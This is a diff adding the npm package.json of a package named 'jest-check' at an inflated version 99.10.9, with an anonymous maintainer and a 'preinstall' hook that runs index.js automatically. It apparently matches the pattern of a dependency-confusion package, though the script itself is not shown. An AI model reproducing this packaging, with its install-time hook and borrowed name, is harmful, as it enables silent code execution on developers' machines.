@@ -1,0 +1,39 @@
+{
+    "name": "jest-check",
+    "version": "99.10.9",
+    "description": "azbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "jest-check@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-L1vpUkWFetOU5MfBiLYSECGdt7z8MO65t15/BN5bnO9/hLDkYBrC+2D3yue4x5qawlippul3XXMsyHgWGrBgFQ==",
+        "shasum": "c50a50770f2c3abdcbc0ef5b386b5b492da132ca",
+        "tarball": "https://registry.npmjs.org/jest-check/-/jest-check-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 5062,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPHowACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpPsBAApLZMeZItJHsL3JXw2eJa0EzvMY91ZpG4fyuDC8f8Pxt96ESp\r\nSFx+mojY9+SLID2GXeSaMmgUP6Wx+8Ul8VG2ery07t3iPs6bOmB3ekYrSLZv\r\nnjzVkyR1j4PgosozFCAh/SstYLvm01UirizFJIYE3XTbKXKGOg4aJX/3Ltg1\r\n079w+51nUpGGsVBDztMtKxDMX2MpnH4eGplO7bSuxjlNjsCUAcpoDV/mldum\r\nMkxIWYlW+BjeswzjLN9iGFtmktvB0mpt7dYltlc2fuwy0mV7j7eX+9mEQqGM\r\nZdJ+b/aWfzmomdlWoeQsFPPqkLbt8+R7WPgVrhGirp6WRrjqcMdpe4HbnvZt\r\nGDRCQ/EX5oqN6m77+Nsp6oUwTXQBznFD6wjjRq8JBLm+9wrWj0aPjxuPft7y\r\nqyfTfjLEF9A+8B4Buzz5MnnqFtCvU5gN52j/NsvidFX6pbaEGvgtuYu/JRf5\r\npgfy7nvvAMw3QAdjGJNJINlB0LtOBP4JErz2UBo4ryTyf0aVyRIqbgqtsQi/\r\nH6dV+wMo2/OpBHOfr5+3R/qKvB5vZ7ZphzZGha8/lETcDa76XDSBDFXMwjJZ\r\ndWHaDQ2HBK5BrocuW88BI6uBR81YcMEHgX77mBYxbPmMBqMsrm7eVTKShMqJ\r\nrxUhGvSbO9X7nFZJh4KjkrfiXtc90bYigGE=\r\n=nqWS\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "7rqj5w1v",
+        "email": "7rqj5w1v@rt11.ml"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "7rqj5w1v",
+            "email": "7rqj5w1v@rt11.ml"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/jest-check_99.10.9_1648130608037_0.4662546250600701"
+    },
+    "_hasShrinkwrap": false
+}
